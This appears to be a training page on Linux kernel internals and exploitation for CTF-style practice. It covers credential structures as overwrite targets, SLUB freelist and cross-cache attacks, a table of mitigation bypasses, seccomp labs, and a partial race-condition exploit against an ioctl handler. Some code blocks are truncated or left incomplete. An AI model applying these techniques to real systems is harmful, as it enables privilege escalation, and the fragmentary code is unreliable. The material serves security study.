Linux Kernel Fundamentals

Kernel Architecture

Linux is a monolithic kernel — all core services (scheduler, VFS, networking, drivers) run in a single address space at ring 0. Loadable kernel modules (LKMs) extend functionality at runtime without recompilation.

┌─────────────────────────────────────────────────┐
│  Userspace  (Ring 3)                            │
│  applications, libc, system daemons             │
├─────────────────────────────────────────────────┤
│  Syscall interface  (SYSCALL instruction)       │
├─────────────────────────────────────────────────┤
│  Kernel  (Ring 0)                               │
│  ┌──────────┬──────────┬──────────┬───────────┐ │
│  │Scheduler │   VFS    │ Net Stack│  Drivers  │ │
│  ├──────────┼──────────┼──────────┼───────────┤ │
│  │   MM     │  IPC     │ Security │  Modules  │ │
│  └──────────┴──────────┴──────────┴───────────┘ │
├─────────────────────────────────────────────────┤
│  Hardware                                       │
└─────────────────────────────────────────────────┘

Syscall Mechanism

On x86_64 Linux, userspace invokes syscalls via the syscall instruction. The CPU loads the handler address from MSR_LSTAR (MSR 0xC0000082), which points to entry_SYSCALL_64.

// Syscall flow:
// 1. User puts syscall number in RAX, args in RDI, RSI, RDX, R10, R8, R9
// 2. Executes SYSCALL instruction
// 3. CPU: saves RIP→RCX, RFLAGS→R11, loads RIP from MSR_LSTAR
// 4. entry_SYSCALL_64 runs → swapgs, switch to kernel stack
// 5. Dispatches via sys_call_table[rax]
// 6. Returns via SYSRET (or IRET if signal pending)
# Read MSR_LSTAR (requires root)
rdmsr 0xC0000082

# View syscall table (if kallsyms available)
cat /proc/kallsyms | grep sys_call_table

# Trace syscalls of a process
strace -f -e trace=all ./binary
strace -c ./binary          # summary/count mode

Kernel Memory Layout

The kernel occupies the upper half of the 64-bit virtual address space (canonical high addresses).

                    │   addr + page_offset_base │

Process Management

task_struct

Every process/thread is represented by a task_struct (~6KB). Key fields for exploitation:

struct task_struct {
    // ... scheduling, state ...
    pid_t                   pid;
    pid_t                   tgid;          // thread group id
    struct task_struct      *parent;
    struct list_head        children;
    struct mm_struct        *mm;           // memory descriptor (NULL for kernel threads)
    const struct cred       *cred;         // effective credentials ← exploit target
    const struct cred       *real_cred;    // objective credentials
    char                    comm[TASK_COMM_LEN]; // executable name
    struct files_struct     *files;        // open file descriptors
    struct nsproxy          *nsproxy;      // namespaces
    // ...
};

cred Structure

The cred struct holds all privilege information. Overwriting it is the classic kernel exploit goal.

struct cred {
    kuid_t  uid;    // real UID
    kgid_t  gid;    // real GID
    kuid_t  suid;   // saved UID
    kgid_t  sgid;   // saved GID
    kuid_t  euid;   // effective UID  ← if 0, you're root
    kgid_t  egid;   // effective GID
    kuid_t  fsuid;  // filesystem UID
    kgid_t  fsgid;  // filesystem GID
    kernel_cap_t cap_inheritable;
    kernel_cap_t cap_permitted;
    kernel_cap_t cap_effective;   // active capabilities
    // ...
};

Interacting from Userspace

// interact.c
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#define IOCTL_READ  0x1337
#define IOCTL_WRITE 0x1338

int main() {
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    char buf[256] = "AAAA";
    ioctl(fd, IOCTL_WRITE, buf);      // write to kernel
    memset(buf, 0, 256);
    ioctl(fd, IOCTL_READ, buf);       // read from kernel
    printf("Read: %s\n", buf);

    close(fd);
    return 0;
}

SLAB/SLUB Allocator

The kernel uses SLUB (the default) for small, frequent allocations. Objects of similar size share slab caches.

# View slab caches
cat /proc/slabinfo
# Or with slabtop
sudo slabtop

# Key caches for exploitation:
# kmalloc-32, kmalloc-64, ..., kmalloc-4096  — generic caches
# cred_jar          — credential structures
# task_struct        — process descriptors
# files_cache        — file descriptor tables
# filp               — struct file objects
// SLUB internals
// Each cache has per-CPU slabs for fast alloc (no locking)
// Free objects are linked via a freelist pointer stored IN the object:
//
//   ┌─────────┬─────────┬─────────┬─────────┐
//   │ obj 0   │ obj 1   │ obj 2   │ obj 3   │  ← slab page
//   │ next→1  │ next→2  │ next→3  │ next→∅  │  ← freelist chain
//   └─────────┴─────────┴─────────┴─────────┘
//
// Alloc: pop head of freelist
// Free:  push onto freelist head
//
// Attack: corrupt freelist pointer → allocate arbitrary memory

Cross-Cache Attacks

// If vuln object is in kmalloc-256 and you want to overlap with cred:
// 1. Spray cred structs (fork many processes)
// 2. Free some → holes in cred_jar
// 3. Trigger vuln alloc that lands in same page (cross-cache)
// 4. Overwrite cred fields via vuln object
//
// Modern defenses: CONFIG_SLAB_VIRTUAL, random freelists
// Need to drain specific caches and force page reuse

MitigationWhat It DoesBypass
KASLRRandomizes kernel base address at bootLeak from /proc, side channels, info leaks in drivers
SMEPKernel can't execute userspace pages (CR4 bit 20)ROP in kernel, flip CR4 bit, native_write_cr4()
SMAPKernel can't read/write userspace pages (CR4 bit 21)Kernel ROP, copy_from/to_user gadgets

Stack Canaries__stack_chk_fail on stack smashLeak canary, avoid overwriting it
CFIControl-flow integrity — validates indirect call targetsCall compliant targets, data-only attacks
RANDSTRUCTRandomizes struct field order at compile timeLeak struct layout, brute force offsets

Netfilter / iptables (Kernel Perspective)

Netfilter provides hooks in the kernel network stack. Packets traverse a chain of hooks at defined points:

# Hook points in packet flow:
# PREROUTING → ROUTING → FORWARD → POSTROUTING  (forwarded packets)
#                       → INPUT   → local process → OUTPUT → POSTROUTING

# Each hook can: NF_ACCEPT, NF_DROP, NF_QUEUE, NF_STOLEN

# Kernel module registering a netfilter hook:
# nf_register_net_hook(net, &nfho);
// Registering a netfilter hook in a module
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

static unsigned int hook_func(void *priv, struct sk_buff *skb,
                              const struct nf_hook_state *state) {
    // inspect/modify packet
    return NF_ACCEPT;  // or NF_DROP
}

static struct nf_hook_ops nfho = {
    .hook     = hook_func,
    .pf       = PF_INET,
    .hooknum  = NF_INET_PRE_ROUTING,
    .priority = NF_IP_PRI_FIRST,
};

seccomp-bpf

seccomp (Secure Computing) restricts which syscalls a process can make. BPF filters inspect syscall number and arguments.

// seccomp strict mode — only read/write/exit/sigreturn
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);

// seccomp-bpf — custom filter
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

struct sock_filter filter[] = {
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),   // kill on execve
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),   // allow everything else
};
struct sock_fprog prog = { .len = 4, .filter = filter };

prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
# Dump seccomp filter of a process
cat /proc/<pid>/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter

# Use seccomp-tools to dump BPF rules (CTF essential)
seccomp-tools dump ./binary

Lab 3: Interact with a Kernel Module via ioctl

Easy

Objective: Load the provided character device module, then write a userspace program to communicate with it via ioctl(). Read and write data to the kernel buffer.

// lab_device.c — kernel module
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

#define IOCTL_SET_MSG 0xDEAD
#define IOCTL_GET_MSG 0xBEEF

static char msg[128] = "default_secret";

static long lab_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case IOCTL_SET_MSG:
            if (copy_from_user(msg, (void __user *)arg, 128)) return -EFAULT;
            printk(KERN_INFO "lab_device: msg set to '%s'\n", msg);
            return 0;
        case IOCTL_GET_MSG:
            if (copy_to_user((void __user *)arg, msg, 128)) return -EFAULT;
            return 0;
        default:
            return -EINVAL;
    }
}

static struct file_operations lab_fops = { .owner = THIS_MODULE, .unlocked_ioctl = lab_ioctl };
static struct miscdevice lab_misc = { .minor = MISC_DYNAMIC_MINOR, .name = "lab_device", .fops = &lab_fops };
static int __init lab_init(void) { return misc_register(&lab_misc); }
static void __exit lab_exit(void) { misc_deregister(&lab_misc); }
module_init(lab_init);
module_exit(lab_exit);
// lab_user.c — userspace interaction
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>

#define IOCTL_SET_MSG 0xDEAD
#define IOCTL_GET_MSG 0xBEEF

int main() {
    int fd = open("/dev/lab_device", O_RDWR);
    if (fd < 0) { perror("open"); return 1; }

    // Read default message
    char buf[128] = {0};
    ioctl(fd, IOCTL_GET_MSG, buf);
    printf("Got: %s\n", buf);

    // Write new message
    strcpy(buf, "hacked!");
    ioctl(fd, IOCTL_SET_MSG, buf);

    // Read it back
    memset(buf, 0, 128);
    ioctl(fd, IOCTL_GET_MSG, buf);
    printf("Now: %s\n", buf);

    close(fd);
}

// slub_lab.c — observe SLUB behavior

MODULE_LICENSE("GPL");

#define NUM_ALLOCS 16

static void *ptrs[NUM_ALLOCS];

static int __init slub_lab_init(void) {
    int i;

    // Allocate objects from kmalloc-128

        ptrs[i] = kmalloc(100, GFP_KERNEL);

// chardev.c
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
#define BUFSIZE 1024

struct chardev_data {
    char buffer[BUFSIZE];
    size_t len;
};

static int chardev_open(struct inode *inode, struct file *f) {
    struct chardev_data *data = kzalloc(sizeof(*data), GFP_KERNEL);
    if (!data) return -ENOMEM;
    f->private_data = data;
    printk(KERN_INFO "chardev: opened\n");
    return 0;
}

static ssize_t chardev_read(struct file *f, char __user *buf, size_t len, loff_t *off) {
    struct chardev_data *data = f->private_data;
    size_t to_read = min(len, data->len - (size_t)*off);
    if (*off >= data->len) return 0;
    if (copy_to_user(buf, data->buffer + *off, to_read)) return -EFAULT;
    *off += to_read;
    return to_read;
}

static ssize_t chardev_write(struct file *f, const char __user *buf, size_t len, loff_t *off) {
    struct chardev_data *data = f->private_data;
    size_t to_write = min(len, (size_t)BUFSIZE);
    if (copy_from_user(data->buffer, buf, to_write)) return -EFAULT;
    data->len = to_write;
    return to_write;
}

static int chardev_release(struct inode *inode, struct file *f) {
    kfree(f->private_data);
    return 0;
}

static struct file_operations chardev_fops = {
    .owner   = THIS_MODULE,
    .open    = chardev_open,
    .read    = chardev_read,
    .write   = chardev_write,
    .release = chardev_release,
};

static struct miscdevice chardev_misc = {
    .minor = MISC_DYNAMIC_MINOR, .name = "chardev", .fops = &chardev_fops
};
static int __init chardev_init(void) { return misc_register(&chardev_misc); }
static void __exit chardev_exit(void) { misc_deregister(&chardev_misc); }
module_init(chardev_init);

Lab 13: Analyze seccomp Filters

Medium

Objective: Write a program that installs a seccomp-bpf filter, then use seccomp-tools to dump and analyze the filter. Identify which syscalls are blocked and which are allowed.

// seccomp_lab.c
#include <stdio.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <stddef.h>
#include <sys/syscall.h>

// Block execve and execveat, allow everything else
struct sock_filter filter[] = {
    // Load architecture
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),

    // Load syscall number
    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),

    // Block execve (59)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),

    // Block execveat (322)
    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),

    // Allow everything else
    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
};

int main() {
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

    printf("Seccomp filter active! PID=%d\n", getpid());
    printf("Try running: seccomp-tools dump ./seccomp_lab\n");

    // This will work (write is allowed)
    write(1, "write() works!\n", 15);

    // This would be killed: execve("/bin/sh", ...)
    pause();
}

Challenge 11: Race Condition in Module

Hard

A kernel module has a TOCTOU (time-of-check-time-of-use) race condition in its ioctl handler. It checks permissions, then acts on user-provided data without re-validation. Exploit the race window.

// Vulnerable pattern in module:
// 1. copy_from_user(&req, user_ptr, sizeof(req))  — check req.len
// 2. if (req.len > MAX_SIZE) return -EINVAL;
// 3. copy_from_user(kbuf, req.data, req.len)       — use req.len
// Race: modify req.len in userspace between step 2 and step 3

// Exploit approach: userfaultfd or mmap + thread

#define _GNU_SOURCE
#include <stdio.h>
#include <pthread.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

struct request {
    size_t len;
    char *data;
};

volatile int race_won = 0;
struct request *shared_req;

void *racer(void *arg) {
    while (!race_won) {
        shared_req->len = 64;      // passes check
        usleep(1);
        shared_req->len = 4096;    // overflows buffer
    }
    return NULL;
}

int main() {
    int fd = open("/dev/vuln", O_RDWR);
    shared_req = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    shared_req->data = /* ... */;

    pthread_t t;
    pthread_create(&t, NULL, racer, NULL);

    // Spam ioctl — eventually the race hits
    for (int i = 0; i < 100000; i++) {
        ioctl(fd, 0x1337, shared_req);
    }
    // ...
}

The classic approach uses userfaultfd to stall a copy_from_user at a precise point, modify the data, then release it. If userfaultfd is blocked, use FUSE or a thread race with high iteration count. The key is that the kernel reads from userspace twice without re-validating.
